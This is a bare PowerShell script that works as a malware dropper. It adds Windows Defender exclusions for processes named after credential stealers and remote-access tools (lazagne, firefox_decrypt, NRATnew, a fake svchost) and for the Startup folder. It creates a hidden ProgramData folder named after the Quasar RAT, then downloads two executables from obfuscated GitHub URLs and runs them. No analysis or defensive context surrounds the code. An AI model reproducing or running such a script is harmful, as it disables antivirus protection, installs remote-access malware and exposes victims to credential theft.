Add-MpPreference -ExclusionProcess "windows10-wifi.exe"
Add-MpPreference -ExclusionProcess "local.exe"
Add-MpPreference -ExclusionProcess "firefox_decrypt.exe"
Add-MpPreference -ExclusionProcess "lazagne.exe"
Add-MpPreference -ExclusionProcess "svchost.exe"
Add-MpPreference -ExclusionProcess "MicrosoftAutoUpdate.exe"
Add-MpPreference -ExclusionProcess "NRATnew.exe"
Add-MpPreference -ExclusionProcess "PersShell.exe"
Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Add-MpPreference -ExlcusionPath "C:\ProgramData\zDATAxD"
mkdir C:\ProgramData\zDATAxD
cd C:\programdata\zdataxd
mkdir quasar
cd quasar
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe'
$destination = 'C:\ProgramData\zDATAxD\quasar\NRATnew.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
start C:\programdata\zdataxd\quasar\NRATnew.exe
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/KJVERtttygFj3e4erjfi3j4g3495g4/main/svchost.exe'
$destination = 'C:\ProgramData\zDATAxD\quasar\svchost.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
start C:\programdata\zdataxd\quasar\svchost.exe
